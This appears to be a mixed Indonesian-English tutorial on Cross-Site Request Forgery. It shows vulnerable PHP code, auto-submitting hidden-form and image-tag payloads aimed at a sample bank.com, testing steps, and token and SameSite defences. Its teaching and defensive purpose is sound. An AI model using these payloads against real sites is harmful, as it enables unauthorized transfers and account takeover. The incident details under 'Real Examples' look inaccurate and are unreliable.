# CSRF - Cross-Site Request Forgery

## 🎯 Apa Itu CSRF?

**Cross-Site Request Forgery (CSRF)** adalah attack dimana attacker force authenticated user untuk execute unwanted actions pada target application. Attack ini hijack session user yang sudah login untuk melakukan unauthorized requests.

## 🔬 Cara Kerja CSRF

### Flow Attack
1. User sudah login ke vulnerable site (bank.com)
2. Attacker buat page (evil.com) dengan POST request ke bank.com
3. Victim visit evil.com
4. Browser auto-send cookies ke bank.com → action executed

### Vulnerable Code
```php
// No CSRF protection = vulnerable
if (isset($_POST['transfer'])) {
    transfer_money($_SESSION['user_id'], $_POST['to'], $_POST['amount']);
}
```

### Attacker Exploit
```html
<!-- evil.com/csrf.html -->
<form action="http://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

## 🏗️ Teknologi Di Baliknya

### Same-Origin Policy (SOP)
- SOP prevents JavaScript cross-domain access
- BUT allows automatic cookie transmission
- This enables CSRF attacks

### Session Cookies
- HttpOnly cookies prevent JS theft (but not CSRF)
- Secure cookies only over HTTPS (not CSRF protection)
- **SameSite flag prevents CSRF!**

## 📊 Tipe Attacks

### GET-based CSRF
```html
<img src="http://bank.com/transfer?to=attacker&amount=1000">
```

### POST-based CSRF
```html
<form action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### Login CSRF
```html
<form action="http://target.com/login" method="POST">
    <input name="email" value="attacker@evil.com">
</form>
```

## 🛠️ Testing Serangan CSRF

### Manual Testing
1. Identify state-changing endpoints (transfer, delete, change_password)
2. Check if no CSRF tokens present
3. Create PoC HTML dengan auto-submitting form
4. Test sebagai authenticated user

### Burp Suite
1. Intercept valid request
2. Right-click → "Engagement tools" → "Generate CSRF PoC"
3. Host on external server, access as logged-in user

### Automated Detection
```bash
# Skipfish CSRF scanner
skipfish -o /tmp/scan http://target.com

# Burp Scanner untuk CSRF detection
```

## 🛡️ Prevention

### CSRF Tokens (Primary Defense)
```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Add to forms
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

// Validate
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF detected!");
}
```

### SameSite Cookies
```php
session_set_cookie_params([
    'samesite' => 'Strict', // Prevent CSRF
    'secure' => true,
    'httponly' => true
]);
```

### Double Submit Cookie
```php
// Set token as cookie AND form field
setcookie('csrf', $token, 0, '/', '', false, true);
<input name="csrf" value="<?php echo $token; ?>">

// Compare both
if ($_POST['csrf'] !== $_COOKIE['csrf']) {
    die("CSRF detected!");
}
```

## 🔍 Real Examples

### GitHub 2018 Incident
- CSRF in personal access token deletion
- Thousands of repos affected
- Fixed with CSRF tokens

### ES File Explorer 2017
- CSRF allowed remote device takeover
- Affected 100 million Android devices

## 📚 Resources

- **OWASP CSRF:** https://owasp.org/www-community/attacks/csrf
- **SameSite Cookies:** Mozilla developer docs
- **CSRF Tokens:** State-of-the-art implementation

---

**CSRF = session riding attack.** Prevention: CSRF tokens + SameSite cookies = mandatory untuk applications dengan authentication. Master testing dan prevention untuk secure web development. 🔄🛡️
